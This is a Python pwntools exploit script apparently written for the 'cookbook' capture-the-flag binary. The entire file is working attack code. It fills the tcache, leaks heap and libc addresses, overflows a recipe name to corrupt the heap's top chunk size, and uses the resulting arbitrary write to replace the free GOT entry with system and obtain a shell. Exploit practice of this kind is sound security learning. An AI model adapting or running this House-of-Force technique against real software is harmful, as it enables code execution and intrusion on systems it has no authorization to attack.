import pwn
import ctypes

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'i386'

ADDRESS_SIZE = 4

# r = pwn.process('./cookbook', env={'LD_PRELOAD': './libc-2.27.so'})
r = pwn.process('./cookbook')

free_current_ingredient = 0x08048e06
new_ingredient_malloc = 0x08048dbb
cookbook_malloc = 0x08048bbc

pwn.gdb.attach(r, f"""

""")

input("wait")

END_OF_MENU = "[q]uit\n"
END_OF_INGREDIENT_MENU = "[e]xport saving changes (doesn't quit)?\n"

def start():
    r.recvuntil("what's your name?\n")
    r.sendline("hackerman")
    r.recvuntil(END_OF_MENU)

def create_recipe():
    r.sendline("c")
    r.recvuntil(END_OF_MENU)
    r.sendline("n")
    r.recvuntil(END_OF_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_recipe(name):
    r.sendline("c")
    r.recvuntil(END_OF_MENU)
    r.sendline("g")
    r.sendline(name)
    r.recvuntil(END_OF_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def create_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("n")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_ingredient(name):
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("g")
    r.sendline(name)
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def save_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("e")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def exterminate_ingredient(name):
    r.sendline("e")
    r.recvuntil("which ingredient to exterminate? ")
    r.sendline(name)
    r.recvuntil(END_OF_MENU)

def list_ingredient_stats():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("l")
    r.recvuntil("calories: ")
    leak = int(r.recvuntil("\n")[:-1])
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)
    return leak

def delete_current_new_ingredient():
    r.sendline("a")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("d")
    r.recvuntil(END_OF_INGREDIENT_MENU)
    r.sendline("q")
    r.recvuntil(END_OF_MENU)

def name_cookbook(name_size, name, wait=True):
    r.sendline("g")
    r.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : ")
    r.sendline(hex(name_size))
    r.sendline(name)
    if wait:
        r.recvuntil("the new name of the cookbook is ")
        leak = r.recvuntil("\n")[:-1]
        r.recvuntil(END_OF_MENU)
        return leak

RECIPE_INSTRUCTIONS_BUF_SIZE = 0x330
OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE = 0x50

new_top_chunk_size = 0xffffffff

start()

T_CACHE_LIMIT = 7

for i in range(T_CACHE_LIMIT):
    create_ingredient()
    name_ingredient(str(i))
    save_ingredient()

for i in range(T_CACHE_LIMIT):
    exterminate_ingredient(str(i))

heap_leak_once = 0x8699a90
top_chunk_addr_once = 0x869a118

top_chunk_offset_from_leak = top_chunk_addr_once - heap_leak_once

create_ingredient()
heap_leak = list_ingredient_stats()
curr_top_chunk_addr = heap_leak + top_chunk_offset_from_leak

print("heap leak:")
print(hex(heap_leak))
print("top_chunk_addr:")
print(hex(curr_top_chunk_addr))

create_recipe()
name_recipe(b"A" * RECIPE_INSTRUCTIONS_BUF_SIZE + b"B" * OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE + pwn.p32(new_top_chunk_size))

# create_ingredient()
# name_ingredient("a")
# save_ingredient()

# create_ingredient()
# name_ingredient("b")
# save_ingredient()

# loaded_ingredients = ["water", "tomato", "basil", "garlic", "onion", "lemon", "corn", "olive oil"]

# for ingredient in loaded_ingredients:
#     exterminate_ingredient(ingredient)

def pseudo_arbitrary_write(next_address, data, wait=True):
    global curr_top_chunk_addr
    CHUNK_OFFSET = 8
    CHUNK_OVERHEAD = 0x11
    next_address = next_address - CHUNK_OFFSET
    alloc_size = ctypes.c_uint(next_address - curr_top_chunk_addr - CHUNK_OVERHEAD).value
    fgets_n = ctypes.c_int(alloc_size).value
    print(f"Allocating {hex(alloc_size)} bytes")
    print(f"Allocated address should be {hex(curr_top_chunk_addr + CHUNK_OFFSET)}")
    if fgets_n < 0:
        print("Moving top_chunk, but not writing anything as fgets size is negative")
    else:
        print(f"writing {pwn.binascii.hexlify(data)} to {hex(curr_top_chunk_addr + CHUNK_OFFSET)}")
    leak = name_cookbook(alloc_size, data, wait=wait)
    curr_top_chunk_addr = ctypes.c_uint(curr_top_chunk_addr + alloc_size + CHUNK_OVERHEAD).value
    print(f"next top_chunk address = {hex(curr_top_chunk_addr)}")
    return leak

# we need to move in big sizes to avoid the previous freed chunks (biggest size is 0x58)
# also, addresses need to be 16 byte aligned

def align_to_16_bytes(addr):
    return (addr // 16) * 16


cookbook_addr = 0x0804d0a8
recipe_addr = 0x0804d0a0 # closes 16 byte aligned address to cookbook
closest_addr_to_cookbook_addr = align_to_16_bytes(cookbook_addr)
offset_from_closest_addr_to_cookbook = cookbook_addr - recipe_addr
free_got = 0x0804d018

pseudo_arbitrary_write(closest_addr_to_cookbook_addr, b"ABCD")

# need to reset the top_chunk size

heap_leak_once_more = 0x9b98a90
recipe_addr_in_heap_once = 0x09b98d10
recipe_addr_in_heap = heap_leak + recipe_addr_in_heap_once - heap_leak_once_more

heap_leak_once_again = 0x82d2a90
start_of_recipe_instructions_once = 0x82d2d9c
offset_from_heap_leak_to_instructions = start_of_recipe_instructions_once - heap_leak_once_again

instructions_addr = heap_leak + offset_from_heap_leak_to_instructions
print("instructions_addr:")
print(hex(instructions_addr))
print("instructions_addr(aligned):")
aligned_instruction_addr = align_to_16_bytes(instructions_addr) + 0x10
print(hex(aligned_instruction_addr))

cookbook_leak = pseudo_arbitrary_write(aligned_instruction_addr, pwn.p32(recipe_addr_in_heap) + b"A" * (offset_from_closest_addr_to_cookbook - ADDRESS_SIZE)  + pwn.p32(free_got))

name_recipe(pwn.p32(new_top_chunk_size))

print("top_chunk_resized")

libc_leak = pwn.u32(cookbook_leak[:4])

print("libc leak:")
print(hex(libc_leak))

libc_leak_once = 0xf7d7d320
system_addr_once = 0xf7d3f250 

system_offset = system_addr_once - libc_leak_once
system_addr = libc_leak + system_offset

print("system addr:")
print(hex(system_addr))

pseudo_arbitrary_write(free_got, b"ABCD")
pseudo_arbitrary_write(free_got + 0x50, pwn.p32(system_addr), wait=False)

r.interactive()